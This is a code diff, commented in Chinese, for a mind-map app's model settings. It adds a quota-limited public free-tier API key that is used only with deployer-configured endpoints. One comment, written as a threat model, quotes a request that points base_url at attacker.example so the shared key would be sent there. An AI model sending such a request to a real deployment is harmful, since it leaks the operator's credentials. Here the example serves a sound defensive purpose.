@@ -106,6 +106,12 @@ SOURCE_UNBOUND = "unbound"
 #: 现问列表选出来的。合并成一个来源会让面板显示一个用户从没填过的模型名，
 #: 而且额度用完之后那句"次数用完了"就无处可挂。
 SOURCE_FREE = "free"
+#: 用的是**部署方配的公共免费密钥**（`MINDMAP_FREE_TIER_API_KEY`），不是谁的私钥。
+#:
+#: 必须与 `instance` / `env` 分开，因为它是唯一一档**有次数上限**的：这份密钥是
+#: 给大家试用的，每天几次由 `generation/quota.py` 记账。合并来源会让"这次要不要
+#: 扣次数"无从判断——而那正是额度这件事的全部。
+SOURCE_PUBLIC = "public"
 
 #: 长度上限。base_url / model 各 200，密钥 500：它们进 SQLite、进日志、进
 #: 界面输入框，超长的值只会在排查时变成噪音（也顺手挡住"把整份证书贴进来"）。
@@ -592,10 +598,20 @@ def free_tier_endpoint() -> tuple[str, str]:
     取值口径就是实例行 → 环境变量（跳过当前用户那一行）：免费模型是"部署方的
     coding plan 里那些"，与某个用户自己填的供应商无关。用户填了自己的密钥时
     `resolve()` 根本不会走免费档，所以这里也不需要关心他。
+
+    密钥**优先用公共那把**（`MINDMAP_FREE_TIER_API_KEY`）：免费模型的名单是
+    那把钥匙所属 coding plan 的事实。没有它才退回实例行/环境变量那把——那种
+    部署是"部署方自己的密钥顺便开着免费档"，名单照样是同一个端点问出来的。
     """
+    from app.generation import quota
+
     instance = saved(INSTANCE_OWNER)
     base = _norm_base(instance.base_url) or _norm_base(os.getenv(BASE_URL_ENV, ""))
-    key = _norm_text(instance.api_key) or _norm_text(os.getenv(API_KEY_ENV, ""))
+    key = (
+        quota.public_key()
+        or _norm_text(instance.api_key)
+        or _norm_text(os.getenv(API_KEY_ENV, ""))
+    )
     return base, key
 
 
@@ -621,7 +637,10 @@ def resolve() -> Resolved:
     那一行 → 部署方那一份 → 环境变量。没有身份的人（既没登录也没游客 cookie）
     直接读实例行——这正是我们要的：没有身份的人借用公共配置。
     """
+    # 函数内 import：`generation.quota` 读环境变量与库，反过来 `generation.service`
+    # 又要读本模块，顶层互相 import 有环的风险（与 `_free_model` 同一个理由）。
     from app.auth.identity import current_identity
+    from app.generation import quota
 
     identity = current_identity()
     owner = owner_of(identity)
@@ -653,11 +672,30 @@ def resolve() -> Resolved:
         if bound and bound != host:
             api_key, api_key_source = "", SOURCE_UNBOUND
 
+    # 公共免费密钥：部署方在 `MINDMAP_FREE_TIER_API_KEY` 里放一把"只给免费模型用"
+    # 的钥匙，没有自己密钥的人借它生成，每人每天有次数上限（`generation/quota.py` 记账）。
+    #
+    # **地址也必须是部署方的**，这是这一档唯一的安全前提：公共密钥是"部署方那把
+    # 钥匙"，它只认识部署方配的那台端点。把调用方自己写的 `base_url` 与它配对，
+    # 等于任何人 `PUT /settings/model {"base_url": "https://attacker.example/v1"}`
+    # 就能把公共钥匙领走——不需要密钥、不需要读响应，这正是 P0-1 修过的形状。
+    # 所以判据是**两个来源都在白名单里**，而不是"没有自己的密钥"这种否定式条件：
+    # 白名单每多一个来源都要有人想一次"它的地址是谁选的"，否定式条件不会。
+    #
+    # 用户自己写地址却不填密钥时，这里不给他公共钥匙，于是 `api_key` 仍是空、
+    # `configured` 为假，界面说的是"去填密钥"——那也是加公共密钥之前的行为。
+    # 让他的请求发不出去，比替他挑一把钥匙发到他写的地址上要诚实。
+    if base_url and base_url_source in (SOURCE_INSTANCE, SOURCE_ENV):
+        if api_key_source in (SOURCE_INSTANCE, SOURCE_ENV, SOURCE_UNSET):
+            public = quota.public_key()
+            if public:
+                api_key, api_key_source = public, SOURCE_PUBLIC
+
     # 免费档：**自己没有密钥、借的是部署方的**时候，把模型名换成当前免费的那个。
     #
-    # 判据是 `api_key_source` 落在 `instance` / `env` 上，而不是"没有密钥"：免费模型
-    # 也一样要 key（实测无 key 401 `UNAUTHORIZED`），只是那次调用不收费。所以这一档
-    # 的语义是"用部署方那把 Command Code 的钥匙、但走它不收费的模型"。
+    # 判据是 `api_key_source` 落在 `instance` / `env` / `public` 上，而不是"没有密钥"：
+    # 免费模型也一样要 key（实测无 key 401 `UNAUTHORIZED`），只是那次调用不收费。所以
+    # 这一档的语义是"用部署方那把 Command Code 的钥匙、但走它不收费的模型"。
     #
     # 什么时候不换：
     #   - `saved`：用户填了自己的密钥，按用户的意思走，免费档与他的钱无关；
@@ -667,7 +705,7 @@ def resolve() -> Resolved:
     # **免费档是慢的**（实测吞吐约 24.6 tok/s，一张四十节点的图要几分钟），所以
     # 打开它是一次明确的行为选择：部署方用自己的行填密钥就能退出这一档。
     reasoning_effort: str | None = None
-    if api_key and api_key_source in (SOURCE_INSTANCE, SOURCE_ENV):
+    if api_key and api_key_source in (SOURCE_INSTANCE, SOURCE_ENV, SOURCE_PUBLIC):
         free_model = _free_model(base_url)
         if free_model:
             model, model_source = free_model, SOURCE_FREE
@@ -966,6 +1004,7 @@ __all__ = [
     "API_KEY_ENV",
     "BASE_URL_ENV",
     "DEEP_MODEL_ENV",
+    "FREE_REASONING_EFFORT",
     "INSTANCE_OWNER",
     "LLM_MODE_ENV",
     "MODEL_ENV",
@@ -973,7 +1012,9 @@ __all__ = [
     "Resolved",
     "SOURCE_ENV",
     "SOURCE_FALLBACK",
+    "SOURCE_FREE",
     "SOURCE_INSTANCE",
+    "SOURCE_PUBLIC",
     "SOURCE_SAVED",
     "SOURCE_UNBOUND",
     "SOURCE_UNSET",
@@ -983,6 +1024,7 @@ __all__ = [
     "clear",
     "deep_override",
     "ensure_schema",
+    "free_tier_endpoint",
     "llm_mode",
     "mask_api_key",
     "owner_of",
